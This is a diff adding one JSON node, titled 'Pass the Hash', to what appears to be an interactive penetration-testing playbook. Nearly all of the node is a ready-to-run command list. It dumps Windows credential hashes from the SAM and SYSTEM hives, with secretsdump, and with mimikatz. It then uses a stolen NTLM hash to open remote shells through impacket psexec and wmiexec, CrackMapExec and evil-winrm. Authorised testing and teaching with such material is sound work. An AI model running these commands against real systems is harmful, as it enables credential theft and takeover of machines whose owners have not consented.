@@ -1,0 +1,18 @@
+{
+  "id": "pth",
+  "phase": "WINDOWS",
+  "title": "Pass the Hash",
+  "body": "Got NTLM hash but no plaintext password? PTH with impacket tools or CrackMapExec. Requires LocalAccountTokenFilterPolicy=1 for local accounts over network logons.",
+  "cmd": "# ── DUMP HASHES FIRST ────────────────────────────────\n# Via SAM (needs SYSTEM)\nreg save HKLM\\sam sam\nreg save HKLM\\system system\nimpacket-secretsdump -sam sam -system system local\n\n# Via secretsdump remote (needs admin creds)\nimpacket-secretsdump administrator:password@$ip\n\n# Via mimikatz\nsekurlsa::logonpasswords\n\n# ── PASS THE HASH ─────────────────────────────────────\n# impacket-psexec\nimpacket-psexec Administrator@$ip -hashes :NTLMHASH\n\n# impacket-wmiexec\nimpacket-wmiexec Administrator@$ip -hashes :NTLMHASH\n\n# CrackMapExec\ncrackmapexec smb $ip -u Administrator -H NTLMHASH\ncrackmapexec smb $ip -u Administrator -H NTLMHASH --exec-method smbexec\n\n# evil-winrm\nevil-winrm -i $ip -u Administrator -H NTLMHASH\n\n# ── LOCALACCOUNTTOKENFILTERPOLICY ─────────────────────\n# If PTH fails for local admin over network:\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy\n# Must be 1 for local accounts to PTH over SMB/WinRM",
+  "warn": "PTH only works with NTLM hashes, not Net-NTLMv2. Net-NTLMv2 must be cracked or relayed — it cannot be passed directly.",
+  "choices": [
+    {
+      "label": "Got shell via PTH",
+      "next": "got_root_windows"
+    },
+    {
+      "label": "Need to crack hash first",
+      "next": "hashcrack"
+    }
+  ]
+}
